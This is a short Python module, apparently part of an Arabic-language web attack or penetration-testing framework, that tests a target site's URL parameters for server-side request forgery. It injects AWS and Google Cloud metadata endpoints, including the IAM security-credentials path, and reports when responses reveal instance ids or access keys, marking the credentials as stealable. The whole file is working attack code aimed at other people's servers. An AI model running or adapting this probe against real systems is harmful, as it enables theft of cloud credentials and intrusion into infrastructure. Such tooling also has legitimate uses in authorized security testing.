# metadata.py — استهداف خدمة metadata السحابية عبر SSRF
from core.registry import module
from core.http import get
from core.helpers import norm_target, get_params
from core.wordlists import COMMON_PARAMS

@module("metadata", "cloud", "اختبار metadata السحابية")
def run(turl, a, R):
    base = norm_target(turl)
    metas = ["http://169.254.169.254/latest/meta-data/",
             "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "http://169.254.169.254/computeMetadata/v1/",
             "http://metadata.google.internal/computeMetadata/v1/"]
    for p in get_params(turl) or COMMON_PARAMS:
        for m in metas:
            st, _, b = get(f"{base}/?{p}={__import__('urllib.parse').quote(m)}")
            blob = b.lower()
            if "ami-id" in blob or "security-credentials" in blob or \
               "instance-id" in blob or "accesskeyid" in blob:
                R.vuln(f"Metadata السحابية متاحة عبر المعامل {p}: {m}")
                R.vuln("  بيانات اعتماد IAM قابلة للسرقة — CRITICAL!")
                return
    R.info("لم نصل إلى metadata — استخدم وحدة ssrf مع --callback لمزيد من التحقق")
